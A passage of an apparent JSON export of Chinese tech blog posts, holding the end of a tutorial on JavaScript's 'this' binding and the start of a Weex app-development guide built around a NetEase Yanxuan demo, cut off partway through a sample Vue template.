Window\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样一个最简单的函数，不属于任何一个对象，就是一个函数，这样的情况在 JavaScript 的在浏览器中的非严格模式默认是属于全局对象 window 的，在严格模式，就是 undefined。 \u003c/p\u003e\n\u003cp\u003e但这是一个全局的函数，很容易产生命名冲突，所以不建议这样使用。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e函数作为方法调用\u003c/h2\u003e\n\u003cp\u003e所以说更多的情况是将函数作为对象的方法使用。比如例 2：\u003cbr\u003e例 2：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\n        }\n    }\n    a.fn();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里定义一个对象 \u003ccode\u003ea\u003c/code\u003e，对象 \u003ccode\u003ea\u003c/code\u003e 有一个属性（\u003ccode\u003ename\u003c/code\u003e）和一个方法（\u003ccode\u003efn\u003c/code\u003e）。\u003c/p\u003e\n\u003cp\u003e然后对象 \u003ccode\u003ea\u003c/code\u003e 通过 \u003ccode\u003e.\u003c/code\u003e 方法调用了其中的 fn 方法。\u003c/p\u003e\n\u003cp\u003e然后我们一直记住的那句话“\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e”，所以在 fn 中的 this 就是指向 a 的。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e使用构造函数调用函数\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果函数调用前使用了 new 关键字, 则是调用了构造函数。\u003cbr\u003e这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 构造函数:\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003emyFunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003earg1, arg2\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.firstName = arg1;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lastName  = arg2;\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// This    creates a new object\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e myFunction(\u003cspan class=\"hljs-string\"\u003e\"Li\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e);\na.lastName;                             \u003cspan class=\"hljs-comment\"\u003e// 返回 \"Cherry\"\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这就有要说另一个面试经典问题：new 的过程了，(ಥ_ಥ)\u003cbr\u003e这里就简单的来看一下 new 的过程吧：\u003cbr\u003e伪代码表示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e myFunction(\u003cspan class=\"hljs-string\"\u003e\"Li\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e myFunction{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e obj = {};\n    obj.__proto__ = myFunction.prototype;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e result = myFunction.call(obj,\u003cspan class=\"hljs-string\"\u003e\"Li\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e result === \u003cspan class=\"hljs-string\"\u003e'obj'\u003c/span\u003e? result : obj;\n}\u003c/code\u003e\u003c/pre\u003e\u003col\u003e\n\u003cli\u003e创建一个空对象 obj;\u003c/li\u003e\n\u003cli\u003e将新创建的空对象的隐式原型指向其构造函数的显示原型。\u003c/li\u003e\n\u003cli\u003e使用 call 改变 this 的指向\u003c/li\u003e\n\u003cli\u003e如果无返回值或者返回一个非对象值，则将 obj 返回作为新对象；如果返回值是一个新对象的话那么直接直接返回该对象。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e所以我们可以看到，在 new 的过程中，我们是使用 call 改变了 this 的指向。 \u003c/p\u003e\n\u003ch2 id=\"-\"\u003e作为函数方法调用函数\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在 JavaScript 中, 函数是对象。\u003c/p\u003e\n\u003cp\u003eJavaScript 函数有它的属性和方法。\u003cbr\u003ecall() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身\u003c/p\u003e\n\u003cp\u003e在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。\u003cbr\u003e在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这个时候我们再来看例 6：\u003cbr\u003e例 6：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efn\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e'Cherry'\u003c/span\u003e;\n        innerFunction();\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einnerFunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n        }\n    }\n\n    fn()\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里的 innerFunction() 的调用是不是属于第一种调用方式：作为一个函数调用（它就是作为一个函数调用的，没有挂载在任何对象上，所以对于没有挂载在任何对象上的函数，在非严格模式下 this 就是指向 window 的）\u003c/p\u003e\n\u003cp\u003e然后再看一下 例 7：\u003cbr\u003e例 7：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)     \n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            },\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e );\n        }\n\n    };\n\n    a.func2()     \u003cspan class=\"hljs-comment\"\u003e// this.func1 is not a function\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个简单一点的理解可以理解为“\u003cstrong\u003e匿名函数的 this 永远指向 window\u003c/strong\u003e”，你可以这样想，还是那句话\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e，那么我们就来找最后调用匿名函数的对象，这就很尴尬了，因为匿名函数名字啊，笑哭，所以我们是没有办法被其他对象调用匿名函数的。所以说 匿名函数的 this 永远指向 window。\u003c/p\u003e\n\u003cp\u003e如果这个时候你要问，那匿名函数都是怎么定义的，首先，我们通常写的匿名函数都是自执行的，就是在匿名函数后面加 \u003ccode\u003e()\u003c/code\u003e 让其自执行。其次就是虽然匿名函数不能被其他对象调用，但是可以被其他函数调用啊，比如例 7 中的 setTimeout。\u003c/p\u003e\n","buildTime":"1514876739.6664","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0709"},"id":"59c4d696f265da065d2b7843","author":{"$oid":"5a4b770f19da8721f49c06fc"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"网易严选App感受Weex开发（已完结）","meta":{"likeCount":0},"tag":["iOS","APP","Weex"],"comment":[],"shortContent":"什么都不说，先给你感受下weex的效果。以下就是我使用weex，4*8h（不连续）做出来的demo，其中还包括素材收集，踩坑总结等时间。 不得不说，使用Weex开发App对于我们纯前端人员来说，是件很爽的事情，只要你熟悉了他的语法，基本可以做到一周上手写app。极其适合交互要求…","content":"\u003cblockquote\u003e\n\u003cp\u003e自打出生的那一天起，WEEX就免不了被拿来同React Native“一决高下”的命运。React Native宣称「Learn Once, Write Anywhere」，而WEEX宣称「Write Once, Run Everywhere」。在我看来，并没有谁更好，只有谁更合适。下面我将围绕WEEX入门进行讲解。\u003cbr\u003e（如果你尚不了解React Native，并想简单入门，可以阅读\u003ca href=\"https://segmentfault.com/a/1190000010989345\"\u003e【整理】ReactNative快速入门笔记\u003c/a\u003e）\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"-app-weex-\"\u003e网易严选App感受Weex开发\u003c/h1\u003e\n\u003cp\u003e什么都不说，先给你感受下weex的效果。以下就是我使用weex，4*8h（不连续）做出来的demo，其中还包括素材收集，踩坑总结等时间。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/22/a2f7c70ee3f84795bacda589162645d2\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e此处是github源码地址：\u003cbr\u003e\u003ca href=\"https://github.com/zwwill/yanxuan-weex-demo\"\u003ehttps://github.com/zwwill/yanxuan-weex-demo\u003c/a\u003e\u003cbr\u003e感谢【Star】【Fock】支持随便搞\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e不得不说，使用Weex开发App对于我们纯前端人员来说，是件\u003cstrong\u003e\u003cem\u003e很爽\u003c/em\u003e\u003c/strong\u003e的事情，只要你熟悉了他的语法，基本可以做到一周上手写app。极其适合交互要求不高，时间紧迫，人手不足的同构开发需求。\u003c/p\u003e\n\u003cp\u003e但是，当然有但是，如果你想写出一个完美的app，你就需要在性能优化上下很大的功夫，包括动画的优化，过场的优化，图片的优化，细节的打磨等等，在这就是你需要掌握或者“能写”一些原生的代码，不然有些功能你是\u003cbr\u003e实现不了的，比如status bar的属性更改，开场动画的制作，内存的回收，webview的监听等等。\u003c/p\u003e\n\u003cp\u003e下面我们具体讲讲入门知识\u003c/p\u003e\n\u003ch1 id=\"write-once-run-everywhere\"\u003eWrite Once, Run Everywhere\u003c/h1\u003e\n\u003cp\u003eWeex 提供了多端一致的技术方案。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e首先 web 开发体验在各端当中是相同的。包括语法设计和工程链路。\u003c/li\u003e\n\u003cli\u003e其次，Weex 的组件、模块设计都是 iOS、Android、Web 的开发者共同讨论出来的，有一定的通用性和普遍性。\u003c/li\u003e\n\u003cli\u003eWeex 开发同一份代码，可以在不同的端上分别执行，避免了多端的重复研发成本。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在同构这条路上，WEEX比ReactNative做得更彻底，他“几乎”做到了，“你来使用vue写一个webapp，我顺便给你编译成了ios和android的原生app”\u003c/p\u003e\n\u003cp\u003e至于为什么要造这个轮子，官方给了以下说法\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e1、今天在技术社区有大量的 web 开发者，Weex 可以赋能更多的 web 开发者构建高性能和高体验的移动应用。\u003cbr\u003e2、Web 开发本身具有非常强的高效率和灵活性，这和 Weex 想解决的移动端动态性问题不谋而合。\u003cbr\u003e3、Web 标准和开发体验是很多顶尖而优秀的科技公司共同讨论和建设的结果，本身的设计和理念都有极高的\u003cbr\u003e4、品质保障，同时 Weex 也希望可以借此机会努力为标准贡献一点自己的微薄之力。\u003cbr\u003e5、Web 是一种标准化的技术，标准本身就是一种力量，基于标准、尊重标准、贴近标准都意味着拥有更多的可能性。\u003cbr\u003e6、Web 今天的生态和社区是非常繁荣的，有很多成熟的工具、库、工程体系、最佳实践可以使用、引入和借鉴。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在我看来，WEEX其实是alibaba团队提高生产效率的产物，在淘宝这类要求多端统一迭代快速的部门，三端约定一种便于统一的规范，在加上时间的发酵，渐渐的就有了此类脚手架的雏形，同时在脸书ReactNative开源带来的极大轰动后，自己也坐不住了吧^_^\u003c/p\u003e\n\u003cp\u003e好了，闲话就说到这，下面就来让我们解剖一下WEEX的优劣良莠。\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e预科\u003c/h1\u003e\n\u003cp\u003e入门Weex前需要了解以下知识，这样能帮助你更快的掌握\u003cbr\u003eNode：\u003ca href=\"http://www.runoob.com/nodejs/nodejs-tutorial.html\"\u003eNode.js 教程\u003c/a\u003e\u003cbr\u003eVue：\u003ca href=\"https://cn.vuejs.org/v2/guide/\"\u003e《Vue.js官方教程》\u003c/a\u003e\u003cbr\u003eES6：\u003ca href=\"http://es6.ruanyifeng.com/\"\u003e《ECMAScript 6 入门》\u003c/a\u003e\u003cbr\u003e再者就是ios和android开发语法的入门和编辑器的使用，当然\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e环境\u003c/h1\u003e\n\u003ch2 id=\"-\"\u003e系统环境要求\u003c/h2\u003e\n\u003cp\u003eIOS : \u003ccode\u003eMacOS\u003c/code\u003e, \u003ccode\u003e黑苹果\u003c/code\u003e\u003cbr\u003eAndroid :\u003ccode\u003eMacOS\u003c/code\u003e,  \u003ccode\u003eLinux\u003c/code\u003e, \u003ccode\u003eWindows\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e配置环境\u003c/h2\u003e\n\u003cp\u003e你可以参考官方文档安装必须的依赖环境\u003ca href=\"http://weex.apache.org/cn/guide/set-up-env.html\"\u003ehttp://weex.apache.org/cn/guide/set-up-env.html\u003c/a\u003e，\u003cbr\u003e也可以直接安装以下环境\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://nodejs.org/\"\u003enode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003enpm\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/weexteam/weex-toolkit\"\u003eweex-toolkit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.apple.com/xcode/\"\u003eXcode\u003c/a\u003e\u003cbr\u003e安装Xcode IDE和Xcode的命令行工具（IOS开发依赖）\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ca href=\"http://www.android-studio.org/\"\u003eAndroid Studio\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e下载必须的插件：\u003c/strong\u003e\u003cbr\u003ea) JDK1.8+\u003cbr\u003eb) Show Package Details\u003cbr\u003ec) Android SDK Build Tools\u003cbr\u003ed) Android Support Repository\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e配置基础环境：\u003c/strong\u003e\u003cbr\u003ea) ANDROID_HOME （如运行是遇到问题可参考此文\u003ca href=\"http://www.jianshu.com/p/a77396301b22\"\u003ehttp://www.jianshu.com/p/a77396301b22\u003c/a\u003e）\u003cbr\u003eb) JAVA_HOME \u003c/p\u003e\n\u003ch2 id=\"hello-weex\"\u003eHello Weex\u003c/h2\u003e\n\u003cp\u003e官方文档上的入门Hello world是web端的，紧接着介绍了如何\u003cstrong\u003e集成 Weex 到已有应用\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/9/22/0bd69ae872c2a21fb868e1ca541441c9\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e但是，身为一个web前端开发者，如果你不懂原生语音的话，介绍这些并不能起到很好的引导作用，因为web前端开发者都有\u003cstrong\u003e\u003cem\u003e一统前端界\u003c/em\u003e\u003c/strong\u003e的野心（Web+Android+IOS），“寄人篱下”只能是暂时的。\u003c/p\u003e\n\u003cp\u003e所以快速创建并运行一个纯Weex App才是有意义的事儿。\u003c/p\u003e\n\u003cp\u003e如果你在官方教程里没有找到创建工程的教程，可以阅读此文\u003ca href=\"https://segmentfault.com/a/1190000010984857\"\u003e《WEEX快速创建工程 Hello World》\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"vue-native\"\u003eVue Native\u003c/h1\u003e\n\u003cp\u003eWeex在迭代的过程中选择了于Vue2.0握手，因为该版本的Vue加入了 Virtual-DOM 和预编译器的设计，使得该框架在运行时能够脱离 HTML 和 CSS 解析，只依赖 JavaScript，如此，Vue在和WEEX合作后，便获得了使用JS预编译原生的组件UI的能力。\u003c/p\u003e\n\u003cp\u003e同React Native一样，有人也将WEEX叫做Vue Native。\u003c/p\u003e\n\u003cp\u003e如果你对Vue还不了解，可以先学习【预科】部分推荐的\u003ca href=\"https://cn.vuejs.org/v2/guide/\"\u003e《Vue.js官方教程》\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e那么接下来我们讲讲，Vue在WEEX中的不同\u003c/p\u003e\n\u003ch1 id=\"vue-weex-\"\u003eVue在WEEX中的不同\u003c/h1\u003e\n\u003cp\u003e虽说WEEX使用vue语言写的，但毕竟是需要在不同平台间运行的，虽然大部分语法都有支持，但是依然有部分语法是不同的\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e语法差异\u003c/h2\u003e\n\u003ch3 id=\"1-html-\"\u003e1、“html标签”\u003c/h3\u003e\n\u003cp\u003e目前 Weex 支持了基本的容器 (div)、文本 (text)、图片 (image)、视频 (video) 等\u003cstrong\u003e组件\u003c/strong\u003e，注意是组件，而不是标签，虽然使用起来跟html标签很像，至于其他标签基本可以使用以上组件组合而成。\u003c/p\u003e\n\u003ch3 id=\"2-weex-dom\"\u003e2、Weex 环境中没有 DOM\u003c/h3\u003e\n\u003cp\u003e因为Weex解析vue得到的并不是dom，而是原生布局树\u003c/p\u003e\n\u003ch3 id=\"3-\"\u003e3、支持有限的事件\u003c/h3\u003e\n\u003cp\u003e并不支持 Web 中所有的事件类型，详情请参考\u003ca href=\"http://weex.apache.org/cn/references/common-event.html\"\u003e《通用事件》\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"4-bom-api\"\u003e4、没有BOM但可以调用原生API\u003c/h3\u003e\n\u003cp\u003e在 Weex 中能够调用移动设备原生 API，使用方法是通过注册、调用模块来实现。其中有一些模块是 Weex 内置的，如 clipboard 、 navigator 、storage 等。\u003cbr\u003e\u003ca href=\"http://weex.apache.org/cn/references/modules/clipboard.html\"\u003e《clipboard 剪切板》\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://weex.apache.org/cn/references/modules/navigator.html\"\u003e《navigator 导航控制》\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://weex.apache.org/cn/references/modules/storage.html\"\u003e《storage 本地存储 》\u003c/a\u003e\u003cbr\u003e为了保持框架的通用性，Weex 内置的原生模块有限，不过 Weex 提供了横向扩展的能力，可以扩展原生模块，具体的扩展方法请参考\u003ca href=\"http://weex.apache.org/cn/references/advanced/index.html\"\u003e《iOS 扩展》\u003c/a\u003e 和\u003ca href=\"http://weex.apache.org/cn/references/advanced/extend-to-android.html\"\u003e《Android 扩展》\u003c/a\u003e。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e样式差异\u003c/h2\u003e\n\u003cp\u003eWeex 中的样式是由原生渲染器解析的，出于性能和功能复杂度的考虑，Weex 对 CSS 的特性做了一些取舍\u003cbr\u003e1、Weex 中只支持单个类名选择器，不支持关系选择器，也不支持属性选择器。\u003cbr\u003e2、组件级别的作用域，为了保持web和 Native 的一致性，需要\u003ccode\u003e\u0026lt;style scoped\u0026gt;\u003c/code\u003e写法\u003cbr\u003e3、支持了基本的盒模型和 flexbox 布局，详情可参考\u003ca href=\"http://weex.apache.org/cn/references/common-style.html\"\u003eWeex 通用样式文档\u003c/a\u003e。但是需要注意的是，\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不支持\u003ccode\u003edisplay: none;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e样式属性暂不支持简写（提高解析效率）\u003c/li\u003e\n\u003cli\u003eflex布局需要注意web的兼容性\u003c/li\u003e\n\u003cli\u003e不支持css动画和3D样式\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"weex-\"\u003eWeex开发\u0026amp;调试\u003c/h1\u003e\n\u003ch2 id=\"vue-\"\u003evue语法\u003c/h2\u003e\n\u003cp\u003e举个栗子，以下是严选App Demo首页的简化代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs vue\"\u003e\u0026lt;template\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026nbsp;class=\"wrapper\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;text\u0026nbsp;class=\"iconfont\"\u0026gt;\u0026lt;/text\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;home-header\u0026gt;\u0026lt;/home-header\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;scroller\u0026nbsp;class=\"main-list\"\u0026nbsp;offset-accuracy=\"300px\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;refresher\u0026gt;\u0026lt;/refresher\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026nbsp;class=\"cell-button\"\u0026nbsp;@click=\"jumpWeb('https://m.you.163.com')\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;yx-slider\u0026nbsp;:imageList=\"YXBanners\"\u0026nbsp;\u0026gt;\u0026lt;/yx-slider\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026nbsp;class=\"cell-button\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;block-1\u0026nbsp;:title=\"block1.title\"\u0026nbsp;:items=\"block1.items\"\u0026gt;\u0026lt;/block-1\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/scroller\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e\u0026lt;/template\u0026gt;\u003cbr\u003e\u0026lt;style\u0026nbsp;scoped\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.iconfont\u0026nbsp;{\u0026nbsp;\u0026nbsp;font-family:iconfont;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.main-list{\u0026nbsp;position:\u0026nbsp;fixed;\u0026nbsp;top:\u0026nbsp;168px;\u0026nbsp;bottom:\u0026nbsp;90px;\u0026nbsp;left:\u0026nbsp;0;\u0026nbsp;right:\u0026nbsp;0;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026lt;/style\u0026gt;\u003cbr\u003e\u0026lt;script\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;navigator\u0026nbsp;=\u0026nbsp;weex.requireModule('navigator');\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;import\u0026nbsp;util\u0026nbsp;from\u0026nbsp;'../../src/assets/util';\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;import\u0026nbsp;Header\u0026nbsp;from\u0026nbsp;'../components/Header.vue';\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;import\u0026nbsp;refresher\u0026nbsp;from\u0026nbsp;'../components/refresh.vue';\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;import\u0026nbsp;YXSlider\u0026nbsp;from\u0026nbsp;'../components/YXSlider.vue';\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;import\u0026nbsp;Block1\u0026nbsp;from\u0026nbsp;'../components/Block1.vue';\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;export\u0026nbsp;default\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;components:\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;'home-header':\u0026nbsp;Header,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026n